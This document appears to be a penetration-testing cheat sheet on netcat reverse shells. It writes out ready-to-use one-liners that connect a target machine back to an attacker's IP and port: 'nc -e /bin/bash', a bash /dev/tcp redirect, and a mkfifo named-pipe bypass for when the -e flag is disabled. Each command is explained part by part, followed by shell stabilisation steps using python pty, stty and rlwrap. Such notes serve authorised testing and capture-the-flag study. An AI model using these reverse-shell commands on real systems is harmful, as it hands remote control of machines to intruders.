---
description: Creating reverse shells with netcat
---

# Netcat

## Basic Reverse Shell

#### Target Machine

The simplest command to spawn the shell is&#x20;

```shell
nc {ATTACKER-IP} {PORT} -e /bin/bash
```

The `-e /bin/bash` portion of the command instructs Netcat to pass any input from the user directly on to the program `/bin/bash`.

Often the machine will have the `-e` flag disabled thus preventing this straightforward method of shell creation.

## Disabled Execution Bypass

For obvious reasons the `-e` flag presents a huge security risk for netcat installations and is thus often disabled by default. Should the flag be disabled its functionality can be replicated via some creativity in the command line.

### Method 1 (Linux)

This method is somewhat unreliable but can be tried as a first attempt.

```bash
user@target:~$ bash -i >& /dev/tcp/{Listener-IP}/{PORT} 0>&1
```

| Component      | Description                                                                             |
| -------------- | --------------------------------------------------------------------------------------- |
| `-i`           | Makes shell interactive                                                                 |
| `/dev/tcp/...` | Some older Linux distros allow network access via the `/dev/tcp/<IP>/<PORT>` file path  |
| `0>&1`         | Binds STDIN and STDOUT together (and to the listening port)                             |

### Method 2 (Linux)

This method tends to be a more reliable bypass.

```bash
user@target:~$ mkfifo /tmp/f; nc {IP} {PORT} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

| Component        | Description                                                                                                                                                                                                                               |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mkfifo /tmp/f`  | Creates a named pipe at `/tmp/f`                                                                                                                                                                                                          |
| `nc {IP} {PORT}` | Invokes netcat and points it at the IP and PORT of the listener                                                                                                                                                                           |
| `< /tmp/f`       | Redirects output of named pipe (`/tmp/f`) into netcat connection (returns it to attacker via network)                                                                                                                                     |
| `\| /bin/sh`     | Pipes the output from netcat to the input of `/bin/sh`                                                                                                                                                                                    |
| `> /tmp/f`       | Redirects the output from /bin/sh to named pipe                                                                                                                                                                                           |
| `2>&1`           | <p>Binds (<code>>&#x26;</code> operator) the stderr (output number 2) and the stdout (output number 1).<br><br>Both are going into <code>/tmp/f</code> per step above.</p>                                                                |
| `rm /tmp/f`      | <p>The named pipe persists as long as the shell connection is active (held in a loop by the redirects).<br><br>Once the connection is broken this ensures the named pipe (created by the attacker) is removed from the target system.</p> |

## Stabilization Techniques

### Python

Linux boxes generally have Python installed by default and it can be used to stabilize the shell. For this reason this method will generally work on Linux boxes but most Windows machines do not have python installed and enabled by default.

The shell should be launched with `python -c 'import pty;pty.spawn("/bin/bash")'` as the execution invocation.

* This command is used to _upgrade_ an existing dumb shell
* The `pty` module gives capability to initiate a pseudo-terminal that can force  `su` and `ssh`  commands to think they are run in standard terminal

Once a dumb reverse shell is obtained run it can be upgraded as follows

```bash
kali@kali:~$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.119.209] from (UNKNOWN) [192.168.209.52] 41726

$ python3 -c 'import pty; pty.spawn("/bin/bash")'    # Run on attacker's machine in "dumb shell"
```

At this point the upgraded shell is suspended with `Ctrl + Z`. The attacker's terminal can then be used to run some stabilizing commands before resuming the shell.

```bash
kali@kali:~$ export TERM=xterm
kali@kali:~$ stty raw -echo; fg
```

| Command             | Action                                                                                                                                                                                                                      |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `export TERM=xterm` | Sets xterm as the terminal window manager                                                                                                                                                                                   |
| `stty raw -echo`    | <p>Sets I/O to standard device and turns off attacker's own terminal echo.<br><br>Gives access to tab autocomplete, arrow key usage, and <code>Ctrl + C</code> can be used to kill processes without exiting the shell.</p> |
| `fg`                | Foregrounds the shell job.                                                                                                                                                                                                  |

This technique is discussed more thoroughly in [this](https://www.infosecademy.com/netcat-reverse-shells/) blog.

### rlwrap

Program which gives user access to history, tab auto-completion and the arrow keys immediately upon receiving a shell.

* Particularly useful with Windows shells which are typically difficult to stabilize
* Some additional manual stabilization must be done in order to use Ctrl+C command in the terminal to stop commands on target without exiting reverse shell

```bash
kal@kali:~$ rlwrap nc -lvnp {PORT}
```

Invoked by simply placing `rlwarp` command ahead of the standard `nc` listener command for a reverse shell.

If the target is Linux the shell can be fully stabilized at this point by:

1. Suspend the shell with `Ctrl + Z`
2. Execute `stty raw -echo; fg` on the attacking machine to stabilize shell and then foreground the suspended job
